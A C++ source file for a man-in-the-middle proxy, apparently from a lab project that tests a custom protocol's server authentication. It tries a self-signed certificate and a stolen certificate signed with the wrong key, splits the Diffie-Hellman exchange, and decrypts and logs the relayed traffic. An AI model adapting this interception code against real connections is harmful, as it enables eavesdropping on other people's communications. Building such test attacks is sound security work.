#include "../network/protocol.hpp"
#include "../network/framing.hpp"
#include "../crypto/dh.hpp"
#include "../crypto/crypto.hpp"
#include "../crypto/server_auth.hpp"

#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <thread>
#include <atomic>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>


// Port the proxy listens on, client connects to this port thinking it is real server
const int PROXY_PORT = 5001;

// Address and port of the REAL server
char* REAL_SERVER_IP;
int REAL_SERVER_PORT;

// Attack mode:
// 1 = Fake / Self-signed certificate (Mallory's cert & key) -> fails CA verification
// 2 = Stolen legitimate server.crt, but signing with Mallory's key -> fails proof-of-possession
int ATTACK_MODE = 1;

std::string read_file(const std::string& path) {
    std::ifstream file(path);
    if (!file) return "";
    std::stringstream buffer;
    buffer << file.rdbuf();
    return buffer.str();
}

int connect_to_server() {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        std::cerr << "[MITM] socket() failed for server connection\n";
        return -1;
    }

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(REAL_SERVER_PORT);
    inet_pton(AF_INET, REAL_SERVER_IP, &addr.sin_addr);

    if (connect(fd, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) < 0) {
        std::cerr << "[MITM] connect() to real server failed\n";
        close(fd);
        return -1;
    }

    std::cout << "[MITM] Connected to real server at "
              << REAL_SERVER_IP << ":" << REAL_SERVER_PORT << "\n";
    return fd;
}

// PHASE 3: Attempt authentication with victim client
bool auth_handshake_with_client(int client_fd) {
    std::string cert_to_send;
    std::string key_to_sign_with;

    if (ATTACK_MODE == 1) {
        // Mode 1: Untrusted / self-signed certificate
        std::cout << "[MITM] Attack Mode 1: Sending untrusted certificate (mallory.crt)...\n";
        cert_to_send = read_file("src/proxy/mallory.crt");
        key_to_sign_with = read_file("src/proxy/mallory.key");
    } else {
        // Mode 2: Real server certificate, but using Mallory's key (Proof-of-possession bypass attempt)
        std::cout << "[MITM] Attack Mode 2: Sending real server certificate (server.crt), signing with mallory.key...\n";
        cert_to_send = read_file("src/server/server.crt");
        key_to_sign_with = read_file("src/proxy/mallory.key");
    }

    if (cert_to_send.empty() || key_to_sign_with.empty()) {
        std::cerr << "[MITM] Failed to read certificate or key files\n";
        return false;
    }

    // 1. Send CERT message
    Message cert_message;
    cert_message.type = MessageType::CERT;
    cert_message.content = cert_to_send;

    if (!send_frame(client_fd, serialize_message(cert_message))) {
        std::cerr << "[MITM] Failed to send certificate to client\n";
        return false;
    }
    std::cout << "[MITM] Sent certificate to client.\n";

    // 2. Receive CHALLENGE from client
    std::string challenge_payload;
    if (!receive_frame(client_fd, challenge_payload)) {
        std::cerr << "[MITM] Client disconnected or rejected certificate\n";
        return false;
    }

    Message challenge_message;
    if (!parse_message(challenge_payload, challenge_message) || challenge_message.type != MessageType::CHALLENGE) {
        std::cerr << "[MITM] Expected CHALLENGE message from client\n";
        return false;
    }
    std::cout << "[MITM] Received challenge from client: " << challenge_message.content << "\n";

    // 3. Sign challenge using key_to_sign_with
    std::string signature = sign_challenge(challenge_message.content, key_to_sign_with);
    if (signature.empty()) {
        std::cerr << "[MITM] Failed to sign challenge\n";
        return false;
    }

    // 4. Send CHALLENGE_RESP
    Message challenge_response;
    challenge_response.type = MessageType::CHALLENGE_RESP;
    challenge_response.content = signature;

    if (!send_frame(client_fd, serialize_message(challenge_response))) {
        std::cerr << "[MITM] Failed to send challenge response to client\n";
        return false;
    }
    std::cout << "[MITM] Sent signed challenge response to client.\n";

    return true;
}

std::vector<uint8_t> dh_handshake_with_client(int client_fd) {
    // 1. Receive client's public key
    std::string payload;
    if (!receive_frame(client_fd, payload)) {
        throw std::runtime_error("Failed to receive DH_HELLO from client");
    }

    Message msg;
    if (!parse_message(payload, msg) || msg.type != MessageType::DH_HELLO) {
        throw std::runtime_error("Expected DH_HELLO from client");
    }

    BignumUniquePtr client_pub = customHexToBignumUniquePtr(msg.content);

    // 2. Generate Mallory's own keypair.
    DHkeypair dh = dh_generate_keypair();

    // 3. Send Mallory's public key to the client while pretending to be the server
    Message reply;
    reply.type    = MessageType::DH_HELLO;
    reply.content = BignumUniquePtrToHexString(dh.public_key);

    if (!send_frame(client_fd, serialize_message(reply))) {
        throw std::runtime_error("Failed to send DH_HELLO to client");
    }

    // 4. Compute shared secret and derive AES key
    std::vector<uint8_t> secret  = dhGetSecret(dh, client_pub);
    std::vector<uint8_t> aes_key = deriveAesKey(secret);

    print_fingerprint(aes_key, "[MITM] Client<->Proxy fingerprint");

    return aes_key;
}

std::vector<uint8_t> dh_handshake_with_server(int server_fd) {
    // 1. Generate Mallory's own keypair for communication with the real server
    DHkeypair dh = dh_generate_keypair();

    // 2. Send Mallory's public key to the real server pretending to be the client.
    Message hello;
    hello.type    = MessageType::DH_HELLO;
    hello.content = BignumUniquePtrToHexString(dh.public_key);

    if (!send_frame(server_fd, serialize_message(hello))) {
        throw std::runtime_error("Failed to send DH_HELLO to server");
    }

    // 3. Receive server's public key
    std::string payload;
    if (!receive_frame(server_fd, payload)) {
        throw std::runtime_error("Failed to receive DH_HELLO from server");
    }

    Message msg;
    if (!parse_message(payload, msg) || msg.type != MessageType::DH_HELLO) {
        throw std::runtime_error("Expected DH_HELLO from server");
    }

    BignumUniquePtr server_pub = customHexToBignumUniquePtr(msg.content);

    // 4. Compute shared secret and derive AES key
    std::vector<uint8_t> secret  = dhGetSecret(dh, server_pub);
    std::vector<uint8_t> aes_key = deriveAesKey(secret);

    print_fingerprint(aes_key, "[MITM] Proxy<->Server fingerprint");

    return aes_key;
}

//threads to handle relaying messages between client and server.
void relay(int src_fd, int dst_fd,
           const std::vector<uint8_t>& src_key,
           const std::vector<uint8_t>& dst_key,
           const std::string& direction,
           std::atomic<bool>& done)
{
    while (!done) {
        std::string plaintext;

        // receive_frame_enc decrypts using src_key; returns false on close or GCM failure
        if (!receive_frame_enc(src_fd, plaintext, src_key)) {
            break;
        }

        // Log the intercepted plaintext
        std::cout << "[MITM] " << direction << ": " << plaintext << "\n";
        std::cout.flush();

        // Re-encrypt with the other side's key and forward
        if (!send_frame_enc(dst_fd, plaintext, dst_key)) {
            break;
        }
    }

    done = true;
    // Unblock the sibling relay thread that may be stuck on recv()
    shutdown(src_fd, SHUT_RD);
    shutdown(dst_fd, SHUT_WR);
}

void handle_connection(int client_fd) {
    std::cout << "[MITM] Victim client connected (fd=" << client_fd << ")\n";

    // Step 0: Attempt server authentication with client
    if (!auth_handshake_with_client(client_fd)) {
        std::cerr << "[MITM] Server authentication failed or client aborted. Attack detected!\n";
        close(client_fd);
        return;
    }

    // Step 1: open a fresh connection to the real server
    int server_fd = connect_to_server();
    if (server_fd < 0) {
        close(client_fd);
        return;
    }

    // Step 2 & 3: two INDEPENDENT DH handshakes — different keypairs, different keys
    std::vector<uint8_t> key_client, key_server;
    try {
        key_client = dh_handshake_with_client(client_fd);
        key_server = dh_handshake_with_server(server_fd);
    } catch (const std::exception& e) {
        std::cerr << "[MITM] DH handshake failed: " << e.what() << "\n";
        close(client_fd);
        close(server_fd);
        return;
    }

    std::cout << "[MITM] Both DH handshakes complete — intercepting all traffic.\n\n";

    // Step 4: relay both directions concurrently
    std::atomic<bool> done{false};

    std::thread t_cs(relay,
                     client_fd, server_fd,
                     std::cref(key_client), std::cref(key_server),
                     "C->S", std::ref(done));

    std::thread t_sc(relay,
                     server_fd, client_fd,
                     std::cref(key_server), std::cref(key_client),
                     "S->C", std::ref(done));

    t_cs.join();
    t_sc.join();

    close(client_fd);
    close(server_fd);

    std::cout << "[MITM] Session (fd=" << client_fd << ") ended.\n";
}

int main(int argc, char* argv[]) {

    if(argc < 3 || argc > 4) {
        std::cout << "[MITM] Usage: " << argv[0] << " <real_server_ip> <real_server_port> [attack_mode: 1 or 2]\n";
        std::cout << "       attack_mode 1 (default): Untrusted certificate (tests CA verification failure)\n";
        std::cout << "       attack_mode 2: Stolen real cert, wrong private key (tests Proof-of-Possession failure)\n";
        return 1;
    }
    REAL_SERVER_IP   = argv[1];
    REAL_SERVER_PORT = std::atoi(argv[2]);
    if (argc == 4) {
        ATTACK_MODE = std::atoi(argv[3]);
    }

    int proxy_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (proxy_fd < 0) {
        std::cerr << "[MITM] socket() failed\n";
        return 1;
    }

    int opt = 1;
    setsockopt(proxy_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    sockaddr_in proxy_addr{};
    proxy_addr.sin_family      = AF_INET;
    proxy_addr.sin_port        = htons(PROXY_PORT);
    proxy_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(proxy_fd, reinterpret_cast<sockaddr*>(&proxy_addr), sizeof(proxy_addr)) < 0) {
        std::cerr << "[MITM] bind() failed\n";
        close(proxy_fd);
        return 1;
    }

    if (listen(proxy_fd, 5) < 0) {
        std::cerr << "[MITM] listen() failed\n";
        close(proxy_fd);
        return 1;
    }

    std::cout << "[MITM] Mallory proxy listening on port " << PROXY_PORT << "\n";
    std::cout << "[MITM] Forwarding to real server at "
              << REAL_SERVER_IP << ":" << REAL_SERVER_PORT << "\n";
    std::cout << "[MITM] Operating in Attack Mode " << ATTACK_MODE << "\n\n";

    while (true) {
        sockaddr_in client_addr{};
        socklen_t   client_len = sizeof(client_addr);

        int client_fd = accept(proxy_fd,
                               reinterpret_cast<sockaddr*>(&client_addr),
                               &client_len);
        if (client_fd < 0) {
            std::cerr << "[MITM] accept() failed\n";
            continue;
        }

        // One thread per victim client
        std::thread(handle_connection, client_fd).detach();
    }

    close(proxy_fd);
    return 0;
}
